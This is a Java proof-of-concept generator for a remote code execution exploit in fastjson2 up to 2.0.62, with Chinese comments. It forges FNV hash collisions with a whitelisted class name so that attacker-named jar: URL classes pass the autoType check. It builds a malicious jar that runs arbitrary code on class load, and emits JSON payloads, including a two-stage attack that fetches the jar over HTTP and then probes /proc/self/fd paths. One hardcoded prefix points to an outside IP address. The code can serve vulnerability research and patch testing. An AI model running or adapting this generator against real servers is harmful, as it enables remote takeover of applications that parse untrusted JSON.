package poc_2062;

import utils.CodeLoader;
import utils.JavassistGen;
import utils.JsonUtil;
import utils.PocIO;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * fastjson2 ≤2.0.62 FNV 哈希碰撞 RCE：生成恶意 jar 与 JSON payload。
 *
 * 原理：默认白名单 acceptHashCodes 硬编码了一个 FNV-1a 哈希
 *   （com.alibaba.fastjson.util.AntiCollisionHashMap，0xA8AAA929446FFCE4），
 *   且 checkAutoType 用"增量 FNV hash"逐字符匹配，命中即 loadClass(typeName)。
 *   攻击者构造前缀 hash 恰为硬编码值的碰撞字符串，即可让任意 jar: URL 类名通过白名单，
 *   由 LaunchedURLClassLoader 远程/本地加载并触发 <clinit>。
 *
 * 恶意类字节码用 javassist 生成，要执行的代码从 code_to_run.txt 读取（含 try-catch 包裹）。
 *
 * 使用：
 *   java -cp ... poc_2062.PocGenerator \
 *       --mode http|file|fd [--host INT_IP] [--port P] [--shape holder|object|list|set|map]
 *       可选: --prefix --output --payload-output --raw-output --min-fd --max-fd
 */
public final class PocGenerator {

    private static final String TARGET_NAME =
            "com.alibaba.fastjson.util.AntiCollisionHashMap";
    private static final String FILE_PREFIX = "jar:file:.tmp.x!.";
    private static final String HTTP_PREFIX =
            "jar:http:..2130706433:18083.x!."; // 127.0.0.1

    private static final String ATTACKER_HTTP_PREFIX =
            "jar:http:..2733850611:18083.x!."; // lazy to change, don't attack me please
    private static final int[] FILE_COLLISION = {
            54377, 36551, 40219, 34432, 50489
    };
    private static final int[] HTTP_COLLISION = {
            0x9BEF, 0x52F5, 0xAA40, 0x26E0, 0xE36D, 0x94F1
    };
    private static final int[] ATTACKER_HTTP_COLLISION = {
            0x0404, 0xD2B5, 0xCE21, 0xA5B1
    };
    // FNV collisions for jar:file:.proc.self.fd.N!. (N = 3..64).
    // They are generated offline and verified again before a JAR is written.
    private static final int[][] FD_COLLISIONS = {
            {44318,55058,43314,46325,48351}, // fd 3
            {51317,37112,32958,50618,33406}, // fd 4
            {38804,41392,42348,48416,35596}, // fd 5
            {49077,35943,55264,38487,55088}, // fd 6
            {47589,41932,42961,41772,53434}, // fd 7
            {49622,37776,52296,42649,55102}, // fd 8
            {52117,37291,38238,37724,41062}, // fd 9
            {54916,43478,45736,52683,40141}, // fd 10
            {39813,40791,40990,54728,45903}, // fd 11
            {46524,33805,33869,45876,39562}, // fd 12
            {49513,36971,46467,33691,46625}, // fd 13
            {38465,40457,46928,33074,40850}, // fd 14
            {35655,48002,38293,46455,43772}, // fd 15
            {45311,33580,34415,47886,52594}, // fd 16
            {32856,34130,37797,41868,54056}, // fd 17
            {36302,53245,35969,52828,50782}, // fd 18
            {51687,32839,49344,54500,54299}, // fd 19
            {53738,46725,38656,39950,52402}, // fd 20
            {36458,41800,43499,42127,39926}, // fd 21
            {32900,47408,50500,37645,49052}, // fd 22
            {45548,49004,47865,54654,55219}, // fd 23
            {44295,52589,51163,49711,40015}, // fd 24
            {36390,55207,41892,49912,42045}, // fd 25
            {49709,52228,51948,46054,46264}, // fd 26
            {53239,54151,53948,42038,33864}, // fd 27
            {35015,44737,44826,48275,45434}, // fd 28
            {35113,50894,51988,48242,38223}, // fd 29
            {39255,41888,53729,37476,53210}, // fd 30
            {41860,38629,47052,33239,50701}, // fd 31
            {36374,32893,43429,38052,44170}, // fd 32
            {44885,42872,52565,38690,38803}, // fd 33
            {43582,51561,42214,51992,53131}, // fd 34
            {34608,39263,54096,35378,51316}, // fd 35
            {50815,51568,49918,39715,42458}, // fd 36
            {53928,45670,52147,55162,49230}, // fd 37
            {50962,40820,53817,34969,37652}, // fd 38
            {43340,34431,33531,53873,35262}, // fd 39
            {48559,41023,38201,50462,54722}, // fd 40
            {36120,48211,48202,51981,39696}, // fd 41
            {54810,35635,51859,43563,35312}, // fd 42
            {47751,53715,37590,37102,40228}, // fd 43
            {47196,37377,32892,46939,54893}, // fd 44
            {52571,54645,39593,43360,54045}, // fd 45
            {52680,41691,52204,36959,46649}, // fd 46
            {52628,45249,34138,32800,46235}, // fd 47
            {34111,37358,51025,42527,39190}, // fd 48
            {41250,35029,39444,43249,42414}, // fd 49
            {35560,54938,42008,54421,35383}, // fd 50
            {49229,41607,41735,52446,48272}, // fd 51
            {38512,48546,44868,53661,36773}, // fd 52
            {53675,52001,47248,52946,52081}, // fd 53
            {33022,48252,53638,43171,34811}, // fd 54
            {34910,46313,46547,43378,50773}, // fd 55
            {34378,37892,53255,38087,42004}, // fd 56
            {50418,45458,37645,43544,40290}, // fd 57
            {33297,47998,40305,47994,46422}, // fd 58
            {51504,48540,54624,49450,53555}, // fd 59
            {38713,38694,51115,52783,48868}, // fd 60
            {33978,35428,54632,45254,44630}, // fd 61
            {36395,43143,51049,52114,35150}, // fd 62
            {45747,41208,51613,48773,48165}, // fd 63
            {55127,52112,39149,37125,36480}  // fd 64
    };

    private PocGenerator() {
    }

    public static void main(String[] args) throws Exception {
        Options options = Options.parse(args);
        Path root = Paths.get("").toAbsolutePath().normalize();
        if ("fd".equals(options.mode)) {
            generateFd(root, options);
            return;
        }

        String prefix = options.prefix == null
                ? ("http".equals(options.mode) ? HTTP_PREFIX : FILE_PREFIX)
                : options.prefix;
        int[] collisionValues = collisionFor(prefix);
        String collision = fromCodeUnits(collisionValues);
        long targetHash = Fnv.hashCode64(TARGET_NAME);
        long collisionHash = Fnv.hashCode64(prefix + collision);
        if (targetHash != collisionHash) {
            throw new IllegalStateException("collision verification failed for prefix: " + prefix);
        }

        String typeName = prefix + collision + ".Exception";
        String internalName = typeName.replace('.', '/');
        String jarEntry = collision + "/Exception.class";
        Path output = root.resolve(options.jarFile()).normalize();
        Path payloadOutput = root.resolve(options.payloadFile()).normalize();
        Path rawOutput = root.resolve(options.rawFile()).normalize();

        // 恶意类字节码：javassist 生成，代码来自 code_to_run.txt（fastjson2 不需要 @JSONType 注解）
        byte[] classBytes = JavassistGen.generate(internalName, CodeLoader.loadBody());

        Map<String, byte[]> entries = new LinkedHashMap<>();
        entries.put(jarEntry, classBytes);
        PocIO.writeJar(output.toString(), entries);

        String payload = buildPayload(options.payloadShape, typeName);
        String metadata = metadataJson(options.mode, prefix, collisionValues,
                typeName, internalName, jarEntry, options.payloadShape,
                payload, targetHash);
        writeText(payloadOutput, metadata);
        writeText(rawOutput, payload);

        System.out.println(metadata);
        System.out.println("raw payload: " + payload);
        System.out.println("collision hash: " + JsonUtil.hex(collisionHash));
    }

    private static String buildPayload(String shape, String typeName) {
        String type = JsonUtil.quote(typeName);
        if ("holder".equals(shape)) {
            return "{\"obj\":{\"@type\":" + type + "}}";
        }
        if ("object".equals(shape)) {
            return "{\"@type\":" + type + "}";
        }
        if ("list".equals(shape) || "set".equals(shape)) {
            return "[{\"@type\":" + type + "}]";
        }
        if ("map".equals(shape)) {
            return "{\"value\":{\"@type\":" + type + "}}";
        }
        throw new IllegalArgumentException(
                "payload shape must be holder, object, list, set or map");
    }

    /**
     * 两阶段攻击：第一个 @type 用 jar:http 让目标下载并缓存 jar（defineClass 因 // 失败，
     * 但 jar 已缓存到 /tmp/jar_cache*.tmp 且 fd 保持打开）；后续 @type 用
     * jar:file:/proc/self/fd/N 打开缓存 jar 中的候选类，命中即 <clinit> 执行。
     */
    private static void generateFd(Path root, Options options) throws Exception {
        if (options.minFd < 3 || options.maxFd > 64 || options.minFd > options.maxFd) {
            throw new IllegalArgumentException("fd range must be within 3..64");
        }

        String httpPrefix = options.prefix;
        int[] httpCollision = collisionFor(httpPrefix);
        String httpCollisionText = fromCodeUnits(httpCollision);
        verifyCollision(httpPrefix, httpCollisionText);
        String stageType = httpPrefix + httpCollisionText + ".Exception";

        Path output = root.resolve(options.jarFile()).normalize();
        Path payloadOutput = root.resolve(options.payloadFile()).normalize();
        Path rawOutput = root.resolve(options.rawFile()).normalize();

        String body = CodeLoader.loadBody();

        Map<String, byte[]> entries = new LinkedHashMap<>();
        List<String> fdTypes = new ArrayList<>();
        for (int fd = options.minFd; fd <= options.maxFd; fd++) {
            String prefix = "jar:file:.proc.self.fd." + fd + "!.";
            int[] collisionValues = collisionForFd(fd);
            String collision = fromCodeUnits(collisionValues);
            verifyCollision(prefix, collision);
            String typeName = prefix + collision + ".Exception";
            String internalName = typeName.replace('.', '/');
            String jarEntry = collision + "/Exception.class";

            // javassist 生成候选类字节码
            entries.put(jarEntry, JavassistGen.generate(internalName, body));
            fdTypes.add(typeName);
        }

        String payloadText;
        if ("list".equals(options.payloadShape) || "set".equals(options.payloadShape)) {
            // 数组多元素：stage + fd 候选一次性爆破
            StringBuilder pb = new StringBuilder(buildPayload("list", stageType));
            pb.setLength(pb.length() - 1); // 去掉 ]
            for (String t : fdTypes) {
                pb.append(",{\"@type\":")
                        .append(JsonUtil.quote(t)).append('}');
            }
            pb.append(']');
            payloadText = pb.toString();
        } else {
            // object/holder/map：每行一个 payload（stage 行 + 每个 fd 行），脚本逐行发送
            StringBuilder lines = new StringBuilder(buildPayload(options.payloadShape, stageType));
            for (String t : fdTypes) {
                lines.append(System.lineSeparator())
                        .append(buildPayload(options.payloadShape, t));
            }
            payloadText = lines.toString();
        }

        PocIO.writeJar(output.toString(), entries);

        String metadata = fdMetadataJson(options, httpPrefix, httpCollision,
                stageType, payloadText);
        writeText(payloadOutput, metadata);
        writeText(rawOutput, payloadText);

        System.out.println(metadata);
        System.out.println("raw payload: " + payloadText);
        System.out.println("stage collision hash: " + JsonUtil.hex(Fnv.hashCode64(httpPrefix + httpCollisionText)));
    }

    private static int[] collisionFor(String prefix) {
        if (FILE_PREFIX.equals(prefix)) {
            return FILE_COLLISION.clone();
        }
        if (HTTP_PREFIX.equals(prefix)) {
            return HTTP_COLLISION.clone();
        }
        if (ATTACKER_HTTP_PREFIX.equals(prefix)) {
            return ATTACKER_HTTP_COLLISION.clone();
        }
        throw new IllegalArgumentException(
                "No bundled collision for prefix: " + prefix
                        + ". Use the documented file or HTTP prefix.");
    }

    private static int[] collisionForFd(int fd) {
        if (fd < 3 || fd > 64) {
            throw new IllegalArgumentException("no bundled fd collision for " + fd);
        }
        return FD_COLLISIONS[fd - 3].clone();
    }

    private static void verifyCollision(String prefix, String collision) {
        long expected = Fnv.hashCode64(TARGET_NAME);
        long actual = Fnv.hashCode64(prefix + collision);
        if (expected != actual) {
            throw new IllegalStateException("collision verification failed for prefix: " + prefix
                    + " actual=" + JsonUtil.hex(actual) + " expected=" + JsonUtil.hex(expected));
        }
    }

    private static String fromCodeUnits(int[] values) {
        StringBuilder value = new StringBuilder(values.length);
        for (int codeUnit : values) {
            value.append((char) codeUnit);
        }
        return value.toString();
    }

    private static void writeText(Path path, String text) throws Exception {
        PocIO.ensureParent(path.toString());
        java.nio.file.Files.write(path, text.getBytes(java.nio.charset.StandardCharsets.US_ASCII));
    }

    private static String metadataJson(String mode, String prefix, int[] collision,
                                       String typeName, String internalName,
                                       String jarEntry, String payloadShape,
                                       String payload,
                                       long targetHash) {
        StringBuilder json = new StringBuilder();
        json.append("{\n")
                .append("  \"mode\": ").append(JsonUtil.quote(mode)).append(",\n")
                .append("  \"target_name\": ").append(JsonUtil.quote(TARGET_NAME)).append(",\n")
                .append("  \"target_hash\": ").append(JsonUtil.quote(JsonUtil.hex(targetHash))).append(",\n")
                .append("  \"type_prefix\": ").append(JsonUtil.quote(prefix)).append(",\n")
                .append("  \"collision_values\": ").append(JsonUtil.intArray(collision)).append(",\n")
                .append("  \"collision_escape\": ")
                .append(JsonUtil.quote(JsonUtil.escapeCodeUnits(collision))).append(",\n")
                .append("  \"type_name\": ").append(JsonUtil.quote(typeName)).append(",\n")
                .append("  \"internal_name\": ").append(JsonUtil.quote(internalName)).append(",\n")
                .append("  \"jar_entry\": ").append(JsonUtil.quote(jarEntry)).append(",\n")
                .append("  \"payload_shape\": ").append(JsonUtil.quote(payloadShape)).append(",\n")
                .append("  \"payload_parse\": ").append(JsonUtil.quote(payload)).append(",\n")
                .append("  \"endpoint\": ").append(JsonUtil.quote(endpointForShape(payloadShape))).append("\n")
                .append("}");
        return json.toString();
    }

    private static String endpointForShape(String shape) {
        if ("object".equals(shape)) {
            return "/api/parse-object";
        }
        if ("list".equals(shape)) {
            return "/api/parse-list";
        }
        if ("set".equals(shape)) {
            return "/api/parse-set";
        }
        if ("map".equals(shape)) {
            return "/api/parse-map";
        }
        return "/api/parse";
    }

    private static String fdMetadataJson(Options options, String httpPrefix,
                                         int[] httpCollision, String stageType,
                                         String payload) {
        StringBuilder json = new StringBuilder();
        json.append("{\n")
                .append("  \"mode\": \"fd\",\n")
                .append("  \"target_name\": ").append(JsonUtil.quote(TARGET_NAME)).append(",\n")
                .append("  \"target_hash\": ").append(JsonUtil.quote(JsonUtil.hex(Fnv.hashCode64(TARGET_NAME)))).append(",\n")
                .append("  \"stage_prefix\": ").append(JsonUtil.quote(httpPrefix)).append(",\n")
                .append("  \"stage_collision_values\": ").append(JsonUtil.intArray(httpCollision)).append(",\n")
                .append("  \"stage_type\": ").append(JsonUtil.quote(stageType)).append(",\n")
                .append("  \"fd_range\": [").append(options.minFd).append(',')
                .append(options.maxFd).append("],\n")
                .append("  \"payload_parse\": ").append(JsonUtil.quote(payload)).append(",\n")
                .append("  \"endpoint\": \"/api/parse\"\n")
                .append('}');
        return json.toString();
    }

    private static final class Options {
        private String mode = "fd";
        private String prefix;
        private String payloadShape = "list";
        private int minFd = 3;
        private int maxFd = 64;

        /** 恶意 jar 输出路径（按 mode 命名，统一放 poc/artifacts/2062/） */
        String jarFile() {
            return "poc/artifacts/2062/" + mode + "-x";
        }

        /** metadata payload.json 输出路径 */
        String payloadFile() {
            return "poc/artifacts/2062/" + mode + "-payload.json";
        }

        /** 纯 payload 文本输出路径 */
        String rawFile() {
            return "poc/artifacts/2062/" + mode + "-payload.txt";
        }

        private static Options parse(String[] args) {
            Options options = new Options();
            for (int i = 0; i < args.length; i++) {
                String arg = args[i];
                if ("--mode".equals(arg)) {
                    options.mode = next(args, ++i, arg);
                } else if ("--prefix".equals(arg)) {
                    options.prefix = next(args, ++i, arg);
                } else if ("--shape".equals(arg) || "--payload-shape".equals(arg)) {
                    options.payloadShape = next(args, ++i, arg).toLowerCase(Locale.ROOT);
                } else if ("--min-fd".equals(arg)) {
                    options.minFd = Integer.parseInt(next(args, ++i, arg));
                } else if ("--max-fd".equals(arg)) {
                    options.maxFd = Integer.parseInt(next(args, ++i, arg));
                } else {
                    throw new IllegalArgumentException("Unknown argument: " + arg);
                }
            }
            if (!"file".equals(options.mode) && !"http".equals(options.mode)
                    && !"fd".equals(options.mode)) {
                throw new IllegalArgumentException("--mode must be file, http or fd");
            }
            if (!"holder".equals(options.payloadShape)
                    && !"object".equals(options.payloadShape)
                    && !"list".equals(options.payloadShape)
                    && !"set".equals(options.payloadShape)
                    && !"map".equals(options.payloadShape)) {
                throw new IllegalArgumentException(
                        "--shape must be holder, object, list, set or map");
            }
            return options;
        }

        private static String next(String[] args, int index, String option) {
            if (index >= args.length) {
                throw new IllegalArgumentException("Missing value for " + option);
            }
            return args[index];
        }
    }
}
